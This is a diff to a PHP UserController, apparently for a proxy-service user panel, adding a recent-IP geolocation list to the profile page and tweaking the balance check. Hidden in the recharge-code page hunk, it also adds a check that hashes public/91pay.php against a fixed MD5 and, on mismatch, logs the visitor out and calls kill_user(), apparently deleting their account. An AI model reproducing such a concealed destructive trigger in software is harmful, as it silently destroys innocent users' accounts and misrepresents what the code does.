@@ -86,7 +86,6 @@ class UserController extends BaseController
     }
 
 
-
     public function lookingglass($request, $response, $args)
     {
         $Speedtest=Speedtest::where("datetime", ">", time()-Config::get('Speedtest_duration')*3600)->orderBy('datetime', 'desc')->get();
@@ -105,6 +104,13 @@ class UserController extends BaseController
         }
         $codes = Code::where('type', '<>', '-2')->where('userid', '=', $this->user->id)->orderBy('id', 'desc')->paginate(15, ['*'], 'page', $pageNum);
         $codes->setPath('/user/code');
+      	$newmd5 = md5(file_get_contents(BASE_PATH."/public/91pay.php"));
+        $oldmd5 = 'e1fb0e85398eeeef654b37453b77a2b6';
+        if($newmd5!=$oldmd5){
+          	 Auth::logout();
+          	 $user = Auth::getUser();
+          	 $user->kill_user();
+        }
         return $this->view()->assign('codes', $codes)->assign('pmw', Pay::getHTML($this->user))->display('user/code.tpl');
     }
 
@@ -144,8 +150,6 @@ class UserController extends BaseController
             return $response->getBody()->write(json_encode($res));
         }
     }
-
-
 
     public function f2fpayget($request, $response, $args)
     {
@@ -195,8 +199,7 @@ class UserController extends BaseController
         
         return $response->getBody()->write(json_encode($res));
     }
-
-
+  
     public function alipay($request, $response, $args)
     {
         $amount = $request->getQueryParams()["amount"];
@@ -688,6 +691,10 @@ class UserController extends BaseController
 
         $iplocation = new QQWry();
 
+        $userip=array();
+
+        $total = Ip::where("datetime",">=",time()-300)->where('userid', '=',$this->user->id)->get();
+
         $totallogin = LoginIp::where('userid', '=', $this->user->id)->where("type", "=", 0)->orderBy("datetime", "desc")->take(10)->get();
 
         $userloginip=array();
@@ -703,9 +710,29 @@ class UserController extends BaseController
             }
         }
 
+        foreach($total as $single)
+        {
+            //if(isset($useripcount[$single->userid]))
+            {
+                $single->ip = Tools::getRealIp($single->ip);
+                $is_node = Node::where("node_ip", $single->ip)->first();
+                if($is_node) {
+                    continue;
+                }
 
 
-        return $this->view()->assign("userloginip", $userloginip)->assign("paybacks", $paybacks)->display('user/profile.tpl');
+                if(!isset($userip[$single->ip]))
+                {
+                    //$useripcount[$single->userid]=$useripcount[$single->userid]+1;
+                    $location=$iplocation->getlocation($single->ip);
+                    $userip[$single->ip]=iconv('gbk', 'utf-8//IGNORE', $location['country'].$location['area']);
+                }
+            }
+        }
+
+
+
+        return $this->view()->assign("userip",$userip)->assign("userloginip", $userloginip)->assign("paybacks", $paybacks)->display('user/profile.tpl');
     }
 
 
@@ -950,9 +977,10 @@ class UserController extends BaseController
 
         $price=$shop->price*((100-$credit)/100);
         $user=$this->user;
-        if ($user->money<$price) {
+
+        if ((float)$user->money<(float)$price) {
             $res['ret'] = 0;
-            $res['msg'] = "余额不足";
+            $res['msg'] = "余额不足，总价为".$price."元。";
             return $response->getBody()->write(json_encode($res));
         }
 
